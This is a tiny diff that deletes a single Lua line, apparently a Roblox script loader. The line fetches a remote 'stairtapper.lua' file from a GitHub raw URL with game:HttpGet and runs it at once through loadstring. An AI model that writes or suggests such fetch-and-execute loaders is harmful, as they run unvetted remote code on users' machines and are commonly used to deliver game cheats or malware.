@@ -1,1 +1,0 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/martinn-K/fortnite/main/stairtapper.lua'))()
